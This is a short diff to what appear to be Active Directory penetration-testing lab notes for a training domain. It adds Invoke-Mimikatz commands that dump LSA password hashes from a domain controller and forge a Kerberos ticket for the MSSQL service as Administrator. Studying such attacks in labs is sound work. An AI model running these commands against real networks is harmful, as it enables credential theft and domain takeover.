@@ -414,3 +414,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser`
   - `GO`
   - We can see that we are an administrator on the SQL Server and we got access to all the SQL databases
+- We can also use 'mimikatz' for this attack.
+  - Dump the RC4 hash
+  - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DomainControllerPCName>`
+  - `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:<SID> /target:dcorp-dc-dollarcorp.moneycorp.local /service:MSSQLSvc /rc4:<RC4-Hash> /user:Administrator /ptt"'`
